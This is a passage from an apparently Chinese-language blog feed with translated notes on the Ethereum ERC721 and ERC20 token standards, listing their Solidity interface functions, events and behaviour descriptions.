builtin">address</span> _owner<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>@notice 统计一个所有者的所有 NFT 数量。</li><li>@dev 分配给零地址的 NFT 被认为是无效的，对于零地址的查询会 <code>throw</code>。</li><li>@para 参数 <code>_owner</code> 是要查询的地址。</li><li>@return 返回值是该地址的 NFT 数量。</li></ul><h3 id="ownerOf"><a href="#ownerOf" class="headerlink" title="ownerOf"></a>ownerOf</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">ownerOf</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _tokenId<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>@notice 找到 NFT 的所有者。</li><li>@dev 分配给零地址的 NFT 被认为是无效的，对于它们的查询应当 <code>throw</code>。</li><li>@para 参数 <code>_tokenId</code> 是 NFT 的标识符。</li><li>@return 返回值是该 NFT 的所有者地址。</li></ul><h3 id="safeTransferFrom"><a href="#safeTransferFrom" class="headerlink" title="safeTransferFrom"></a>safeTransferFrom</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">safeTransferFrom</span><span class="token punctuation">(</span><span class="token builtin">address</span> _from<span class="token punctuation">,</span> <span class="token builtin">address</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _tokenIdm<span class="token punctuation">,</span> <span class="token builtin">bytes</span> data<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>@notice 将一个 NFT 的所有权从一个地址转换到另一个地址。</li><li>@dev 除非是 <code>msg.sender</code> 是该 NFT 的当前所有者、授权的 operator 或批准地址，否则会 <code>throw</code>。如果 <code>_from</code> 不是当前所有者则会 <code>throw</code>。如果 <code>_to</code> 是零地址则会 <code>throw</code>。如果 <code>_tokenId</code> 不是有效的 NFT 则会 <code>throw</code>。当转换完成，该函数会检查  <code>_to</code> 是否是一个智能合约（code size &gt; 0）。如果是，则会在 <code>_to</code> 上调用 <code>onERC721Received</code>，并且如果返回值不是 <code>bytes4(keccak256(&quot;onERC721Received(address,address,uint256,bytes)&quot;))</code> 则会 <code>throw</code>。</li><li>@para 参数 <code>_from</code> 是当前 NFT 的所有者；<code>_to</code> 是新的所有者；<code>_tokenId</code> 是要转换的 NFT；<code>data</code> 是未指定格式的附加数据，在调用 <code>_to</code> 时发送。</li></ul><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">safeTransferFrom</span><span class="token punctuation">(</span><span class="token builtin">address</span> _from<span class="token punctuation">,</span> <span class="token builtin">address</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _tokenId<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>@notice 将一个 NFT 的所有权从一个地址转换到另一个地址。</li><li>@dev&amp;para 与上一个函数工作原理相同，除了要发送的 <code>data</code> 被设为 <code>&quot;&quot;</code>。</li></ul><h3 id="transferFrom"><a href="#transferFrom" class="headerlink" title="transferFrom"></a>transferFrom</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span>  <span class="token function">transferFrom</span><span class="token punctuation">(</span><span class="token builtin">address</span> _from<span class="token punctuation">,</span> <span class="token builtin">address</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _tokenId<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>@notice 转移一个 NFT 的所有权 - 调用者负责确认 <code>_to</code> 能够接收 NFT，否则它们可能会永久丢失。</li><li>@dev 函数会 <code>throw</code> 除非 <code>msg.sender</code> 是该 NFT 的当前所有者、授权的 operater 或批准地址。如果 <code>_from</code> 不是当前所有者则会 <code>throw</code>。如果 <code>_to</code> 是零地址则会 <code>throw</code>。如果 <code>_tokenId</code> 不是有效的 NFT 则会 <code>throw</code>。</li><li>@para 参数 <code>_from</code> 是 NFT 的当前所有者；<code>_to</code> 是新的所有者；<code>_tokenId</code> 是要转换的 NFT。</li></ul><h3 id="approve"><a href="#approve" class="headerlink" title="approve"></a>approve</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span> _approved<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _tokenId<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>@notice 改变或重申(reaffirm)一个 NFT 的批准地址。</li><li>@dev 零地址意味着没有批准地址。除非 <code>msg.sender</code> 是当前 NFT 所有者或当前所有者的授权 operator，否则会 <code>throw</code>。</li><li>@para 参数 <code>_approved</code> 是新的批准的 NFT controller；<code>_tokenId</code> 是要批准的 NFT。</li></ul><h3 id="setApprovalForAll"><a href="#setApprovalForAll" class="headerlink" title="setApprovalForAll"></a>setApprovalForAll</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">setApprovalForAll</span><span class="token punctuation">(</span><span class="token builtin">address</span> _operator<span class="token punctuation">,</span> <span class="token builtin">bool</span> _approved<span class="token punctuation">)</span> <span class="token keyword">external</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>@notice 启用或禁用第三方（“operator”）管理所有 <code>msg.sender</code> 资产的批准。</li><li>@dev 触发 ApprovalForAll 事件。合约必须允许每个所有者的多个 operator。</li><li>@para 参数 <code>_operator</code> 是要添加到授权 operator 集合中的地址；<code>_approved</code> 为 true 表示 operator 被批准，为 false 表示撤销批准。</li></ul><h3 id="getApproved"><a href="#getApproved" class="headerlink" title="getApproved"></a>getApproved</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">getApproved</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _tokenId<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>@notice 获取单个 NFT 的批准地址。</li><li>@dev 如果 <code>_tokenId</code> 不是有效的 NFT 则 <code>throw</code>。</li><li>@para 参数 <code>_tokenId</code> 是要查询批准地址的 NFT。</li><li>@return 返回值是该 NFT 的批准地址，为零则表示没有批准地址。</li></ul><h3 id="isApprovedForAll"><a href="#isApprovedForAll" class="headerlink" title="isApprovedForAll"></a>isApprovedForAll</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">isApprovedForAll</span><span class="token punctuation">(</span><span class="token builtin">address</span> _owner<span class="token punctuation">,</span> <span class="token builtin">address</span> _operator<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>@notice 查询一个地址是否是另一个地址的授权 operator。</li><li>@para 参数 <code>_owner</code> 是拥有 NFT 的地址；<code>_operator</code> 是代表所有者执行的地址。</li><li>@return 如果 <code>_operator</code> 是 <code>_owner</code> 的一个批准 operator 则返回 true，否则返回 false。</li></ul><h2 id="ERC165-接口"><a href="#ERC165-接口" class="headerlink" title="ERC165 接口"></a>ERC165 接口</h2><p><a href="https://eips.ethereum.org/EIPS/eip-165">EIP-165: Standard Interface Detection</a></p><h3 id="supportsInterface"><a href="#supportsInterface" class="headerlink" title="supportsInterface"></a>supportsInterface</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">supportsInterface</span><span class="token punctuation">(</span><span class="token builtin">bytes4</span> interfaceID<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>@notice 查询一个合约是否实现了一个接口。</li><li>@para 参数 <code>interfaceID</code> 是接口标识符(identifier)。</li><li>@dev 接口标识在 ERC165 中规定。该函数使用小于 30,000 的 gas。</li><li>@return 如果合约实现了 <code>interfaceId</code> 并且 <code>interfaceID</code> 不是 <code>0xffffffff</code>，则返回 <code>true</code>；否则返回 <code>false</code>。</li></ul><h2 id="ERC721TokenReceiver-接口"><a href="#ERC721TokenReceiver-接口" class="headerlink" title="ERC721TokenReceiver 接口"></a>ERC721TokenReceiver 接口</h2><p>如果一个钱包(wallet)&#x2F;经纪人(broker)&#x2F;拍卖应用程序(auction application)将接受安全转账，那么它必须实现钱包接口(wallet interface)。</p><p>注意，该接口的 ERC-165 标识符为 <code>0x150b7a02</code>。</p><h3 id="onERC721Received"><a href="#onERC721Received" class="headerlink" title="onERC721Received"></a>onERC721Received</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">onERC721Received</span><span class="token punctuation">(</span><span class="token builtin">address</span> _operator<span class="token punctuation">,</span> <span class="token builtin">address</span> _from<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _tokenId<span class="token punctuation">,</span> <span class="token builtin">bytes</span> _data<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">bytes4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>@notice 处理一个 NFT 的收据。</li><li>@dev ERC721 智能合约在 <code>transfer</code> 之后在接收者上调用该函数。该函数可能 <code>throw</code> 来回滚或拒绝转移(transfer)。除魔法值(magic value)之外的返回必须引起交易回滚。注意，合约地址永远是消息发送方。</li><li>@para 参数 <code>_operator</code> 是调用 <code>safeTransferFrom</code> 函数的地址；<code>_from</code> 是之前拥有代币的地址；<code>_tokenId</code> 是被转移的 NFT 的标识符；<code>_data</code> 是没有指定格式的附加数据。</li><li>@return <code>bytes4(keccak256(&quot;onERC721Received(address,address,uint256,bytes)&quot;))</code> 除非函数 <code>throw</code>。</li></ul><h2 id="ERC721Metadata-接口"><a href="#ERC721Metadata-接口" class="headerlink" title="ERC721Metadata 接口"></a>ERC721Metadata 接口</h2><p>**元数据扩展(metadata extension)**对于ERC-721智能合约是可选的。这允许查询智能合约的名称和关于 NFT 所代表的资产的详细信息。</p><p>注意，该接口的 ERC-165 标识符为 <code>0x5b5e139f</code>。</p><h3 id="name"><a href="#name" class="headerlink" title="name"></a>name</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> _name<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>@notice 本合约中 NFT 集合的描述性名称。</li></ul><h3 id="symbol"><a href="#symbol" class="headerlink" title="symbol"></a>symbol</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">symbol</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span> _symbol<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>@notice 本合约中 NFT 的缩写名称。</li></ul><h3 id="tokenURL"><a href="#tokenURL" class="headerlink" title="tokenURL"></a>tokenURL</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">tokenURL</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _tokenId<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>@notice 给定资产的唯一的统一资源描述符(URL)。</li><li>@dev 如果 <code>_tokenId</code> 不是有效的 NFT 则 <code>throw</code>。URL 在 RFC 3986 中定义。URL 可能指向一个符合 “ERC721 Metadata JSON Schema” 的 JSON 文件。</li></ul><h2 id="ERC721Enumerable-接口"><a href="#ERC721Enumerable-接口" class="headerlink" title="ERC721Enumerable 接口"></a>ERC721Enumerable 接口</h2><p>**枚举扩展(enumeration extension)**对于 ERC-721 智能合约是可选的。这允许您的合约发布完整的 NFT 列表，并使它们可被发现。</p><p>注意，该接口的 ERC-165 标识符为 <code>0x780e9d63</code>。</p><h3 id="totalSupply"><a href="#totalSupply" class="headerlink" title="totalSupply"></a>totalSupply</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">totalSupply</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>@notice 统计该合约的跟踪的 NFT。</li><li>@return 该合约跟踪的有效 NFT 数量，其中的每一个都有已分配和可查询的不为零地址的所有者。</li></ul><h3 id="tokenByIndex"><a href="#tokenByIndex" class="headerlink" title="tokenByIndex"></a>tokenByIndex</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">tokenByIndex</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> _index<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>@notice 枚举有效的 NFT</li><li>@dev 如果 <code>_index</code> &gt;&#x3D; <code>totalSupply()</code> 则函数 <code>throw</code>。</li><li>@para 参数 <code>_index</code> 表示小于 <code>totalSupply()</code> 的一个计数器。</li><li>@return 返回值是第 <code>_index</code> 个 NFT 的代币标识符（未指定排序顺序）。</li></ul><h3 id="tokenOfOwnerByIndex"><a href="#tokenOfOwnerByIndex" class="headerlink" title="tokenOfOwnerByIndex"></a>tokenOfOwnerByIndex</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">tokenOfOwnerByIndex</span><span class="token punctuation">(</span><span class="token builtin">address</span> _owner<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _index<span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>@notice 枚举分配给一个所有者的 NFT。</li><li>@dev 如果 <code>_index</code> &gt;&#x3D; <code>balanceOf(_owner)</code> 或 <code>_owner</code> 是零地址，则函数 <code>throw</code>，这代表无效的 NFT。</li><li>@para 参数 <code>_owner</code> 是我们对其拥有的 NFT 感兴趣的一个地址；<code>_index</code> 是一个小于 <code>balanceOf(_owner)</code> 的计数器。</li><li>@return 返回值是分配给 <code>_owner</code> 的第 <code>_index</code> 个 NFT 的代币标识符（未指定排序顺序）。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ERC721-非同质化代币标准&quot;&gt;&lt;a href=&quot;#ERC721-非同质化代币标准&quot; class=&quot;headerlink&quot; title=&quot;ERC721 非同质化代币标准&quot;&gt;&lt;/a&gt;ERC721 非同质化代币标准&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;以太坊改进</summary>
      
    
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="ERC标准" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/ERC%E6%A0%87%E5%87%86/"/>
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="ERC标准" scheme="https://alphafitz.com/tags/ERC%E6%A0%87%E5%87%86/"/>
    
    <category term="以太坊" scheme="https://alphafitz.com/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
    <category term="DeFi" scheme="https://alphafitz.com/tags/DeFi/"/>
    
  </entry>
  
  <entry>
    <title>ERC20 代币标准</title>
    <link href="https://alphafitz.com/2022/10/22/erc20-token-standard/"/>
    <id>https://alphafitz.com/2022/10/22/erc20-token-standard/</id>
    <published>2022-10-22T11:55:39.000Z</published>
    <updated>2022-10-25T09:03:57.405Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ERC20-代币标准"><a href="#ERC20-代币标准" class="headerlink" title="ERC20 代币标准"></a>ERC20 代币标准</h1><blockquote><p>以太坊改进建议：<a href="https://eips.ethereum.org/EIPS/eip-20">EIP-20: Token Standard</a></p></blockquote><h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><p>ERC20 标准允许在智能合约中为代币实施标准 API。该标准提供了转移代币的基本功能，并允许代币获得批准，以便其它链上第三方使用。</p><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="name"><a href="#name" class="headerlink" title="name"></a>name</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>返回代币的名称。</li><li>可选 - 此方法可用于提高可用性，但接口和其它合约不得期望这些值存在。</li></ul><h3 id="symbol"><a href="#symbol" class="headerlink" title="symbol"></a>symbol</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">symbol</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>返回代币的符号。</li><li>可选 - 此方法可用于提高可用性，但接口和其他合约不得期望这些值存在。</li></ul><h3 id="decimals"><a href="#decimals" class="headerlink" title="decimals"></a>decimals</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">decimals</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint8</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>返回代币使用的小数位数，比如 <code>8</code> 表示将代币数量除以 <code>100000000</code> 得到其用户表示。</li><li>可选 - 此方法可用于提高可用性，但接口和其他合约不得期望这些值存在。</li></ul><h3 id="totalSupply"><a href="#totalSupply" class="headerlink" title="totalSupply"></a>totalSupply</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">totalSupply</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>返回代币的总供应量</li></ul><h3 id="balanceOf"><a href="#balanceOf" class="headerlink" title="balanceOf"></a>balanceOf</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">balanceOf</span><span class="token punctuation">(</span><span class="token builtin">address</span> _owner<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span> balance<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>返回另一个地址为 <code>_owner</code> 的账户的账户余额</li></ul><h3 id="transfer"><a href="#transfer" class="headerlink" title="transfer"></a>transfer</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _value<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span> success<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>将 <code>_value</code> 数量的代币转移到地址 <code>_to</code>，并且必须触发 <code>Transfer</code> 事件。如果消息调用者的账户余额没有足够的代币可以花费，则该函数应当 <code>throw</code>。</li><li>注意，<code>0</code> 值的 Transfer 必须被视为正常传输并触发 <code>Transfer</code> 事件。</li></ul><h3 id="transferFrom"><a href="#transferFrom" class="headerlink" title="transferFrom"></a>transferFrom</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">transferFrom</span><span class="token punctuation">(</span><span class="token builtin">address</span> _from<span class="token punctuation">,</span> <span class="token builtin">address</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _value<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span> success<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>将 <code>_value</code> 数量的代币从地址 <code>_from</code> 转移到地址 <code>_to</code>，并且必须触发 <code>Transfer</code> 事件。</li><li><code>transferFrom</code> 方法用于提款工作流，允许合约代表您转移代币。例如，这可用于允许合约代表您转移代币和&#x2F;或以子货币收取费用。除非 <code>_from</code> 账户通过某种机制有意授权消息的发送者，否则该函数应当 <code>throw</code>。</li><li>注意，0 值的 Transfer 必须被视为正常传输并触发 <code>Transfer</code> 事件。</li></ul><h3 id="approve"><a href="#approve" class="headerlink" title="approve"></a>approve</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">approve</span><span class="token punctuation">(</span><span class="token builtin">address</span> _spender<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _value<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span> success<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>允许 <code>_spender</code> 从你的账户提款多次，直到 <code>_value</code> 数量的金额。如果该函数再次被调用，它将用 <code>_value</code> 覆盖当前的允许值。</li><li>注意：为了防止<a href="https://docs.google.com/document/d/1YLPtQxZu1UAvO9cZ1O2RPXBbT0mooh4DYKjA_jp-RLM/">这里描述</a>和<a href="https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729">讨论</a>的攻击向量，客户端应该确保在创建用户接口时先将允许值设置为 <code>0</code>，然后再为相同的花费者(spender)设置另一个值。尽管合约本身不应该强制执行它，以允许与之前部署的合约向后兼容。</li></ul><h3 id="allowance"><a href="#allowance" class="headerlink" title="allowance"></a>allowance</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">function</span> <span class="token function">allowance</span><span class="token punctuation">(</span><span class="token builtin">address</span> _owner<span class="token punctuation">,</span> <span class="token builtin">address</span> _spender<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">uint256</span> remaining<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>返回仍然允许 <code>_spender</code> 从 <code>_owner</code> 提取的金额。</li></ul><h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><h3 id="Transfer"><a href="#Transfer" class="headerlink" title="Transfer"></a>Transfer</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">event</span> <span class="token function">Transfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">indexed</span> _from<span class="token punctuation">,</span> <span class="token builtin">address</span> <span class="token keyword">indexed</span> _to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _value<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>必须在代币被转移时触发，包括 <code>0</code> 金额转账。</li><li>创建新代币的代币合约应当在创建代币时触发一个 <code>_from</code> 地址设为 <code>0x0</code> 的 <code>Transfer</code> 事件。</li></ul><h3 id="Approval"><a href="#Approval" class="headerlink" title="Approval"></a>Approval</h3><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">event</span> <span class="token function">Approval</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">indexed</span> _owner<span class="token punctuation">,</span> <span class="token builtin">address</span> <span class="token keyword">indexed</span> _spender<span class="token punctuation">,</span> <span class="token builtin">uint256</span> _value<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li>必须在任何成功调用 <code>approve(address _spender, uint256 _value)</code> 的地方触发。</li></ul><h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>以太坊网络上已经部署了大量符合 ERC20 的代币。不同的团队编写了不同的实现，并且有着不同的权衡，比如从节省 gas 到安全性：</p><ul><li><a href="https://github.com/OpenZeppelin/openzeppelin-solidity/blob/9b3710465583284b8c4c5d2245749246bb2e0094/contracts/token/ERC20/ERC20.sol">OpenZeppelin 实现</a></li><li><a href="https://github.com/ConsenSys/Tokens/blob/fdf687c69d998266a95f15216b1955a4965a0a6d/contracts/eip20/EIP20.sol">ConsenSys 实现</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ERC20-代币标准&quot;&gt;&lt;a href=&quot;#ERC20-代币标准&quot; class=&quot;headerlink&quot; title=&quot;ERC20 代币标准&quot;&gt;&lt;/a&gt;ERC20 代币标准&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;以太坊改进建议：&lt;a href=&quot;https://</summary>
      
    
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="ERC标准" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/ERC%E6%A0%87%E5%87%86/"/>
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="ERC标准" scheme="https://alphafitz.com/tags/ERC%E6%A0%87%E5%87%86/"/>
    
    <category term="以太坊" scheme="https://alphafitz.com/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
    <category term="DeFi" scheme="https://alphafitz.com/tags/DeFi/"/>
    
  </entry>
  
  <entry>
    <title>Solidity 文档 0.8.17 笔记</title>
